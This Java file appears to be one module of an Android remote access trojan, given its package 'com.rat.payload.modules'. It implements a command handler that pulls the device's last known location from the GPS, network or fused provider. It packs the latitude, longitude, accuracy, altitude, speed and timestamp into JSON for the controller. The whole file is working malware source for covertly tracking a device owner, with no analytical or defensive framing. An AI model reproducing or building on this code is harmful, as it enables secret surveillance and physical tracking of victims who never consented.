package com.rat.payload.modules;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;

import org.json.JSONObject;

public class LocationModule implements CommandHandler.Command {

    private Context context;

    public LocationModule(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public JSONObject execute(JSONObject args) {
        JSONObject result = new JSONObject();
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) {
                result.put("error", "LocationManager unavailable");
                return result;
            }
            Location lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (lastKnown == null) {
                lastKnown = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            if (lastKnown == null) {
                lastKnown = lm.getLastKnownLocation(LocationManager.FUSED_PROVIDER);
            }
            if (lastKnown != null) {
                result.put("latitude", lastKnown.getLatitude());
                result.put("longitude", lastKnown.getLongitude());
                result.put("accuracy", lastKnown.getAccuracy());
                result.put("altitude", lastKnown.getAltitude());
                result.put("speed", lastKnown.getSpeed());
                result.put("provider", lastKnown.getProvider());
                result.put("timestamp", lastKnown.getTime());
            } else {
                result.put("error", "No last known location");
            }
        } catch (Exception e) {
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }
}
